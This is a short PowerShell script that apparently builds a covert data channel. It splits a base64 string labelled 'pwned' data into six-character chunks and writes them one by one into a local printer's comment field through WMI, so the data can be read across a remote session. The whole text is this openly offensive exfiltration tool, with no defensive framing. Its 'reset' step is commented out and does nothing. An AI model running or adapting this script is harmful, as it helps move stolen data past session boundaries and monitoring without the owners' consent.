# The server running in a PowerShell Session on the client host operating-system
# by DK & MZ

# Enter Printer Max
$j=6

# Enter pwned base64 data.
$pwndata="somedata"

# Fetch printers
$printers=Get-WmiObject -class "Win32_Printer"
$original_pname=$printers[0].Name

# Loop through data
$i=0
while($i -lt $pwndata.Length)
{
    $printers=Get-WmiObject -class "Win32_Printer"

    if($i+$j -lt $pwndata.Length)
    {
        $somedata=$pwndata.SubString($i, $j);
        Write-Host $pwndata.SubString($i, $j)
        #$printers[0].RenamePrinter($somedata);
        $printers[0].comment=$somedata;
        $printers[0].put();
        Write-Host "Changing comment to " $somedata
        $i+=$j      
    }
    else
    {
        $j = $pwndata.Length - $i;
        $somedata=$pwndata.SubString($i, $j)
        write-host $pwndata.SubString($i, $j)
        #$printers[0].RenamePrinter($somedata);
        $printers[0].comment=$somedata;
        $printers[0].put();
        Write-Host "Changing comment to " $somedata
        break;
    }

}

# Reset printer name back to the original.
Write-Host "Original Reset"
$printers=Get-WmiObject -class "Win32_Printer"
#$printers[0].RenamePrinter("END");
